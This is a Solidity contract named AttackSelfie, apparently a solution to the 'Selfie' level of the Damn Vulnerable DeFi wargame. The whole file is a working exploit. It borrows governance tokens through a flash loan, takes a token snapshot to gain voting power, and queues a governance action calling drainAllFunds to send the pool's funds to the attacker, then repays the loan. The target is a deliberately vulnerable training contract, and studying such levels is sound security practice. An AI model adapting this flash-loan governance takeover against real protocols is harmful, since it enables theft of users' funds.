//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie {
    address owner;
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;

    constructor(address _pool, address _governance) {
        owner = msg.sender;
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
    }

    function setUpAttack(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function receiveTokens(address _governanceTokenAddress, uint256 amount)
        external
    {
        token = DamnValuableTokenSnapshot(_governanceTokenAddress);
        token.snapshot();
        governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
        token.transfer(address(pool), amount);
    }
}
